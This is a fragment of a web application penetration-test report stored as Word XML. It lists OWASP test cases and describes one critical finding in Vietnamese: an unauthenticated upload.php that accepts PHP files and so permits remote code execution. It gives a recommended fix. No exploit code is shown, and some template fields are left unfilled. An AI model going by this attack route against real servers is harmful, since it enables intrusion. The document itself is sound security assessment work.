              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="003A3514">
              <w:t>1</w:t>
            </w:r>
            <w:r w:rsidR="00C67807">
              <w:t/>
            </w:r>
            <w:r w:rsidRPr="003A3514">
              <w:t/>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main">
          <w:tcPr>
            <w:tcW w:w="1701" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFC0CB"/>
          </w:tcPr>
          <w:p w14:paraId="1D09345F" w14:textId="77777777" w:rsidR="00086E78" w:rsidRPr="004A61ED" w:rsidRDefault="00086E78" w:rsidP="00086E78">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3A3514">
              <w:t>[[AllVuln.Table.color-Risk_Table]:unprocessed]</w:t>
            </w:r>
            <w:r w:rsidR="00C67807">
              <w:t/>
            </w:r>
            <w:r w:rsidRPr="003A3514">
              <w:t/>
            </w:r>
            <w:r w:rsidR="00D817FB">
              <w:t/>
            </w:r>
            <w:r w:rsidRPr="003A3514">
              <w:t/>
            </w:r>
            <w:r w:rsidR="00D817FB">
              <w:t/>
            </w:r>
            <w:r w:rsidRPr="003A3514">
              <w:t/>
            </w:r>
            <w:r w:rsidR="0044637E">
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidR="0044637E" w:rsidRPr="0044637E">
              <w:t/>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="6942" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="052AF316" w14:textId="77777777" w:rsidR="00086E78" w:rsidRPr="004A61ED" w:rsidRDefault="00086E78" w:rsidP="00086E78">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3A3514">
              <w:t>Test Upload of Malicious Files (OTG-BUSLOGIC-009)</w:t>
            </w:r>
            <w:r w:rsidR="00C67807">
              <w:t/>
            </w:r>
            <w:r w:rsidRPr="003A3514">
              <w:t/>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00086E78" w:rsidRPr="004A61ED" w14:paraId="5BBC4CE9" w14:textId="77777777" w:rsidTr="006D673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04" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="1029575D" w14:textId="77777777" w:rsidR="00086E78" w:rsidRPr="004A61ED" w:rsidRDefault="00086E78" w:rsidP="00086E78">
            <w:pPr>
              <w:spacing w:line="480" w:lineRule="auto"/>
              <w:rPr>
                <w:bCs w:val="0"/>
                <w:sz w:val="21"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="003A3514">
              <w:t>2</w:t>
            </w:r>
            <w:r w:rsidR="00C67807">
              <w:t/>
            </w:r>
            <w:r w:rsidRPr="003A3514">
              <w:t/>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main">
          <w:tcPr>
            <w:tcW w:w="1701" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFC0CB"/>
          </w:tcPr>
          <w:p w14:paraId="1D09345F" w14:textId="77777777" w:rsidR="00086E78" w:rsidRPr="004A61ED" w:rsidRDefault="00086E78" w:rsidP="00086E78">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3A3514">
              <w:t>[[AllVuln.Table.color-Risk_Table]:unprocessed]</w:t>
            </w:r>
            <w:r w:rsidR="00C67807">
              <w:t/>
            </w:r>
            <w:r w:rsidRPr="003A3514">
              <w:t/>
            </w:r>
            <w:r w:rsidR="00D817FB">
              <w:t/>
            </w:r>
            <w:r w:rsidRPr="003A3514">
              <w:t/>
            </w:r>
            <w:r w:rsidR="00D817FB">
              <w:t/>
            </w:r>
            <w:r w:rsidRPr="003A3514">
              <w:t/>
            </w:r>
            <w:r w:rsidR="0044637E">
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidR="0044637E" w:rsidRPr="0044637E">
              <w:t/>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="6942" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="052AF316" w14:textId="77777777" w:rsidR="00086E78" w:rsidRPr="004A61ED" w:rsidRDefault="00086E78" w:rsidP="00086E78">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3A3514">
              <w:t>Review Old, Backup and Unreferenced Files for Sensitive Information (OTG-CONFIG-004)</w:t>
            </w:r>
            <w:r w:rsidR="00C67807">
              <w:t/>
            </w:r>
            <w:r w:rsidRPr="003A3514">
              <w:t/>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00086E78" w:rsidRPr="004A61ED" w14:paraId="5BBC4CE9" w14:textId="77777777" w:rsidTr="006D673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04" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="1029575D" w14:textId="77777777" w:rsidR="00086E78" w:rsidRPr="004A61ED" w:rsidRDefault="00086E78" w:rsidP="00086E78">
            <w:pPr>
              <w:spacing w:line="480" w:lineRule="auto"/>
              <w:rPr>
                <w:bCs w:val="0"/>
                <w:sz w:val="21"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="003A3514">
              <w:t>3</w:t>
            </w:r>
            <w:r w:rsidR="00C67807">
              <w:t/>
            </w:r>
            <w:r w:rsidRPr="003A3514">
              <w:t/>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main">
          <w:tcPr>
            <w:tcW w:w="1701" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FF0000"/>
          </w:tcPr>
          <w:p w14:paraId="1D09345F" w14:textId="77777777" w:rsidR="00086E78" w:rsidRPr="004A61ED" w:rsidRDefault="00086E78" w:rsidP="00086E78">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3A3514">
              <w:t>[[AllVuln.Table.color-Risk_Table]:unprocessed]</w:t>
            </w:r>
            <w:r w:rsidR="00C67807">
              <w:t/>
            </w:r>
            <w:r w:rsidRPr="003A3514">
              <w:t/>
            </w:r>
            <w:r w:rsidR="00D817FB">
              <w:t/>
            </w:r>
            <w:r w:rsidRPr="003A3514">
              <w:t/>
            </w:r>
            <w:r w:rsidR="00D817FB">
              <w:t/>
            </w:r>
            <w:r w:rsidRPr="003A3514">
              <w:t/>
            </w:r>
            <w:r w:rsidR="0044637E">
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidR="0044637E" w:rsidRPr="0044637E">
              <w:t/>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="6942" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="052AF316" w14:textId="77777777" w:rsidR="00086E78" w:rsidRPr="004A61ED" w:rsidRDefault="00086E78" w:rsidP="00086E78">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3A3514">
              <w:t>Testing for Stored Cross Site Scripting(WSTG-INPV-02)</w:t>
            </w:r>
            <w:r w:rsidR="00C67807">
              <w:t/>
            </w:r>
            <w:r w:rsidRPr="003A3514">
              <w:t/>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00086E78" w:rsidRPr="004A61ED" w14:paraId="5BBC4CE9" w14:textId="77777777" w:rsidTr="006D673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04" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="1029575D" w14:textId="77777777" w:rsidR="00086E78" w:rsidRPr="004A61ED" w:rsidRDefault="00086E78" w:rsidP="00086E78">
            <w:pPr>
              <w:spacing w:line="480" w:lineRule="auto"/>
              <w:rPr>
                <w:bCs w:val="0"/>
                <w:sz w:val="21"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="003A3514">
              <w:t>4</w:t>
            </w:r>
            <w:r w:rsidR="00C67807">
              <w:t/>
            </w:r>
            <w:r w:rsidRPr="003A3514">
              <w:t/>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main">
          <w:tcPr>
            <w:tcW w:w="1701" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFC000"/>
          </w:tcPr>
          <w:p w14:paraId="1D09345F" w14:textId="77777777" w:rsidR="00086E78" w:rsidRPr="004A61ED" w:rsidRDefault="00086E78" w:rsidP="00086E78">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3A3514">
              <w:t>[[AllVuln.Table.color-Risk_Table]:unprocessed]</w:t>
            </w:r>
            <w:r w:rsidR="00C67807">
              <w:t/>
            </w:r>
            <w:r w:rsidRPr="003A3514">
              <w:t/>
            </w:r>
            <w:r w:rsidR="00D817FB">
              <w:t/>
            </w:r>
            <w:r w:rsidRPr="003A3514">
              <w:t/>
            </w:r>
            <w:r w:rsidR="00D817FB">
              <w:t/>
            </w:r>
            <w:r w:rsidRPr="003A3514">
              <w:t/>
            </w:r>
            <w:r w:rsidR="0044637E">
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidR="0044637E" w:rsidRPr="0044637E">
              <w:t/>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="6942" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="052AF316" w14:textId="77777777" w:rsidR="00086E78" w:rsidRPr="004A61ED" w:rsidRDefault="00086E78" w:rsidP="00086E78">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3A3514">
              <w:t>Testing for Reflected Cross site scripting (OTG-INPVAL-001)</w:t>
            </w:r>
            <w:r w:rsidR="00C67807">
              <w:t/>
            </w:r>
            <w:r w:rsidRPr="003A3514">
              <w:t/>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00086E78" w:rsidRPr="004A61ED" w14:paraId="5BBC4CE9" w14:textId="77777777" w:rsidTr="006D673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04" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="1029575D" w14:textId="77777777" w:rsidR="00086E78" w:rsidRPr="004A61ED" w:rsidRDefault="00086E78" w:rsidP="00086E78">
            <w:pPr>
              <w:spacing w:line="480" w:lineRule="auto"/>
              <w:rPr>
                <w:bCs w:val="0"/>
                <w:sz w:val="21"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="003A3514">
              <w:t>5</w:t>
            </w:r>
            <w:r w:rsidR="00C67807">
              <w:t/>
            </w:r>
            <w:r w:rsidRPr="003A3514">
              <w:t/>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main">
          <w:tcPr>
            <w:tcW w:w="1701" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFC000"/>
          </w:tcPr>
          <w:p w14:paraId="1D09345F" w14:textId="77777777" w:rsidR="00086E78" w:rsidRPr="004A61ED" w:rsidRDefault="00086E78" w:rsidP="00086E78">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3A3514">
              <w:t>[[AllVuln.Table.color-Risk_Table]:unprocessed]</w:t>
            </w:r>
            <w:r w:rsidR="00C67807">
              <w:t/>
            </w:r>
            <w:r w:rsidRPr="003A3514">
              <w:t/>
            </w:r>
            <w:r w:rsidR="00D817FB">
              <w:t/>
            </w:r>
            <w:r w:rsidRPr="003A3514">
              <w:t/>
            </w:r>
            <w:r w:rsidR="00D817FB">
              <w:t/>
            </w:r>
            <w:r w:rsidRPr="003A3514">
              <w:t/>
            </w:r>
            <w:r w:rsidR="0044637E">
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidR="0044637E" w:rsidRPr="0044637E">
              <w:t/>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="6942" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="052AF316" w14:textId="77777777" w:rsidR="00086E78" w:rsidRPr="004A61ED" w:rsidRDefault="00086E78" w:rsidP="00086E78">
            <w:pPr>
              <w:spacing w:line="480" w:lineRule="auto"/>
              <w:cnfStyle w:val="000000100000" w:firstRow="0" w:lastRow="0" w:firstColumn="0" w:lastColumn="0" w:oddVBand="0" w:evenVBand="0" w:oddHBand="1" w:evenHBand="0" w:firstRowFirstColumn="0" w:firstRowLastColumn="0" w:lastRowFirstColumn="0" w:lastRowLastColumn="0"/>
              <w:rPr>
                <w:sz w:val="21"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="003A3514">
              <w:t>Test number of times a function can be used limits (OTG-BUSLOGIC-005)</w:t>
            </w:r>
            <w:r w:rsidR="00C67807">
              <w:t/>
            </w:r>
            <w:r w:rsidRPr="003A3514">
              <w:t/>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="61DF7024" w14:textId="77777777" w:rsidR="00791F52" w:rsidRPr="004A61ED" w:rsidRDefault="00791F52" w:rsidP="00791F52"/>
    <w:p w14:paraId="53DE0BB0" w14:textId="77777777" w:rsidR="00C42676" w:rsidRDefault="00A946C3" w:rsidP="007476B7">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:bookmarkStart w:id="8" w:name="_Toc34146494"/>
      <w:r>
        <w:t>RECOMMENDATION</w:t>
      </w:r>
      <w:bookmarkEnd w:id="8"/>
    </w:p>
    <w:p w14:paraId="08734D63" w14:textId="77777777" w:rsidR="00C42676" w:rsidRDefault="00EF3B4E" w:rsidP="00EF3B4E">
      <w:r>
        <w:t>After perform</w:t>
      </w:r>
      <w:r w:rsidR="007B584C">
        <w:t>ing</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> security assessment for </w:t>
      </w:r>
      <w:r w:rsidR="007B584C">
        <w:t>application,</w:t>
      </w:r>
      <w:r w:rsidR="00B43995">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="007B584C">
        <w:t>w</w:t>
      </w:r>
      <w:r>
        <w:t>e have some general summary</w:t>
      </w:r>
      <w:r w:rsidR="007B584C">
        <w:t>/comment:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4A6C7866" w14:textId="77777777" w:rsidR="00953924" w:rsidRDefault="00953924" w:rsidP="00B30EE8">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="16"/>
        </w:numPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3E53CC0D" w14:textId="77777777" w:rsidR="00363892" w:rsidRPr="00A64A75" w:rsidRDefault="00185C29" w:rsidP="00C32A40">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:bookmarkStart w:id="9" w:name="_Toc34146495"/>
      <w:r>
        <w:rPr>
          <w:caps w:val="0"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">TECHNICAL </w:t>
      </w:r>
      <w:r w:rsidR="00C32A40" w:rsidRPr="00C32A40">
        <w:rPr>
          <w:caps w:val="0"/>
        </w:rPr>
        <w:t>DET</w:t>
      </w:r>
      <w:r w:rsidR="00C846CA">
        <w:rPr>
          <w:caps w:val="0"/>
        </w:rPr>
        <w:t>AIL</w:t>
      </w:r>
      <w:r w:rsidR="00C32A40">
        <w:rPr>
          <w:caps w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> REPORT</w:t>
      </w:r>
      <w:bookmarkEnd w:id="9"/>
    </w:p>
    <w:p w14:paraId="2FC7F740" w14:textId="77777777" w:rsidR="00CC4809" w:rsidRDefault="00A046AA" w:rsidP="00E9225D">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:bookmarkStart w:id="10" w:name="_Toc34146496"/>
      <w:r>
        <w:t>CRITICAL RISK FINDINGS</w:t>
      </w:r>
      <w:bookmarkStart w:id="11" w:name="_Toc251942038"/>
      <w:bookmarkEnd w:id="10"/>
    </w:p>
    <w:p w14:paraId="256514A3" w14:textId="77777777" w:rsidR="00CC4809" w:rsidRPr="00CC4809" w:rsidRDefault="00CC4809" w:rsidP="00CC4809">
      <w:pPr>
        <w:sectPr w:rsidR="00CC4809" w:rsidRPr="00CC4809" w:rsidSect="00CC4809">
          <w:footerReference w:type="default" r:id="rId20"/>
          <w:type w:val="continuous"/>
          <w:pgSz w:w="11909" w:h="16834" w:code="9"/>
          <w:pgMar w:top="1134" w:right="1134" w:bottom="1134" w:left="1418" w:header="680" w:footer="783" w:gutter="0"/>
          <w:cols w:space="720"/>
          <w:docGrid w:linePitch="360"/>
        </w:sectPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="31D58882" w14:textId="77777777" w:rsidR="006D295D" w:rsidRPr="00B25F11" w:rsidRDefault="003B77D1" w:rsidP="00760616">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r w:rsidRPr="00B25F11">
        <w:t>Test Upload of Malicious Files (OTG-BUSLOGIC-009)</w:t>
      </w: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395"/>
        <w:gridCol w:w="2695"/>
        <w:gridCol w:w="1868"/>
        <w:gridCol w:w="2369"/>
      </w:tblGrid>
      <w:tr w:rsidR="006D295D" w:rsidRPr="00013A35" w14:paraId="7E400094" w14:textId="77777777" w:rsidTr="001B336C">
        <w:trPr>
          <w:trHeight w:val="530"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="9327" w:type="dxa"/>
            <w:gridSpan w:val="4"/>
            <w:shd w:val="clear" w:color="auto" w:fill="00B0F0"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="67E2AE27" w14:textId="77777777" w:rsidR="006D295D" w:rsidRPr="00013A35" w:rsidRDefault="006D295D" w:rsidP="00013A35">
            <w:pPr>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
            </w:pPr>
            <w:bookmarkStart w:id="12" w:name="OLE_LINK1"/>
            <w:bookmarkStart w:id="16" w:name="OLE_LINK2"/>
            <w:r w:rsidRPr="00013A35">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t>VULNERABILITY INFORMATION</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="006D295D" w:rsidRPr="00013A35" w14:paraId="4620D5F6" w14:textId="77777777" w:rsidTr="00013A35">
        <w:trPr>
          <w:trHeight w:val="350"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2395" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF" w:themeFill="background1"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="78633BFA" w14:textId="77777777" w:rsidR="006D295D" w:rsidRPr="00013A35" w:rsidRDefault="006D295D" w:rsidP="00013A35">
            <w:pPr>
              <w:rPr>
                <w:rStyle w:val="PlaceholderText"/>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:b/>
                <w:bCs/>
                <w:color w:val="FFFFFF" w:themeColor="background1"/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00013A35">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:color w:val="000000"/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t>CATEGORY</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="6932" w:type="dxa"/>
            <w:gridSpan w:val="3"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="1200DCBC" w14:textId="77777777" w:rsidR="006D295D" w:rsidRPr="00013A35" w:rsidRDefault="007A3E4C" w:rsidP="00013A35">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="0050547A">
              <w:rPr>
                <w:color w:val="000000" w:themeColor="text1"/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t>[[Critical.Vuln.Category_Vuln]:unprocessed]</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="000000" w:themeColor="text1"/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t/>
            </w:r>
            <w:r w:rsidRPr="0050547A">
              <w:rPr>
                <w:color w:val="000000" w:themeColor="text1"/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t/>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="006D295D" w:rsidRPr="00013A35" w14:paraId="50C0821E" w14:textId="77777777" w:rsidTr="00013A35">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2395" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF" w:themeFill="background1"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="74BD2B03" w14:textId="77777777" w:rsidR="006D295D" w:rsidRPr="00013A35" w:rsidRDefault="006D295D" w:rsidP="00013A35">
            <w:pPr>
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00013A35">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:color w:val="000000"/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t>DESCRIPTION</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="6932" w:type="dxa"/>
            <w:gridSpan w:val="3"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="1827FA78" w14:textId="77777777" w:rsidR="006D295D" w:rsidRPr="00013A35" w:rsidRDefault="0050547A" w:rsidP="00013A35">
            <w:pPr>
              <w:rPr>
                <w:color w:val="000000" w:themeColor="text1"/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="0050547A">
              <w:rPr>
                <w:color w:val="000000" w:themeColor="text1"/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t>Tệp upload.php không thiết lập cơ chế xác thực và không lọc đuôi tệp, kẻ tấn công có thể dễ dàng truy cập và thực hiện tải một tệp php nguy hiểm sau đó thực thi mã từ xa lên máy chủ</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="002214F4" w:rsidRPr="00013A35" w14:paraId="36C833CB" w14:textId="77777777" w:rsidTr="00013A35">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2395" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF" w:themeFill="background1"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="044C9F68" w14:textId="77777777" w:rsidR="002214F4" w:rsidRPr="00013A35" w:rsidRDefault="002214F4" w:rsidP="00013A35">
            <w:pPr>
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00013A35">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t>SEVERITY</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="6932" w:type="dxa"/>
            <w:gridSpan w:val="3"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFC0CB"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="0A8BF87B" w14:textId="77777777" w:rsidR="002214F4" w:rsidRPr="00013A35" w:rsidRDefault="002216B2" w:rsidP="00013A35">
            <w:pPr>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00013A35">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:color w:val="000000" w:themeColor="text1"/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t>Critical</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="0056691F" w:rsidRPr="00013A35" w14:paraId="0659B1EB" w14:textId="77777777" w:rsidTr="00013A35">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2395" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF" w:themeFill="background1"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="3977B38F" w14:textId="77777777" w:rsidR="002214F4" w:rsidRPr="00013A35" w:rsidRDefault="002214F4" w:rsidP="00013A35">
            <w:pPr>
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00013A35">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t>IMPACT</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2695" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FF0000"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="4030535C" w14:textId="77777777" w:rsidR="002214F4" w:rsidRPr="00013A35" w:rsidRDefault="003B048E" w:rsidP="00013A35">
            <w:pPr>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00013A35">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t>High</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1868" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF" w:themeFill="background1"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="18FAC52B" w14:textId="77777777" w:rsidR="002214F4" w:rsidRPr="00013A35" w:rsidRDefault="0056691F" w:rsidP="00013A35">
            <w:pPr>
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00013A35">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t>LIKELIHOOD</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2369" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FF0000"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="676AC6CE" w14:textId="77777777" w:rsidR="002214F4" w:rsidRPr="00013A35" w:rsidRDefault="00636316" w:rsidP="00013A35">
            <w:pPr>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00013A35">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t>High</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="006D295D" w:rsidRPr="00013A35" w14:paraId="6B72A364" w14:textId="77777777" w:rsidTr="00013A35">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2395" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF" w:themeFill="background1"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="3A0B391F" w14:textId="77777777" w:rsidR="006D295D" w:rsidRPr="00013A35" w:rsidRDefault="002214F4" w:rsidP="00013A35">
            <w:pPr>
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00013A35">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:color w:val="000000"/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t>RECOMMEND</w:t>
            </w:r>
            <w:r w:rsidR="0056691F" w:rsidRPr="00013A35">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:color w:val="000000"/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t>ATION</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="6932" w:type="dxa"/>
            <w:gridSpan w:val="3"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="5B9B2F4E" w14:textId="77777777" w:rsidR="006D295D" w:rsidRPr="00013A35" w:rsidRDefault="00AE3A4C" w:rsidP="00013A35">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00AE3A4C">
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t>Thiết lập cơ chế xác thực và không cho phép up các tệp html, php</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
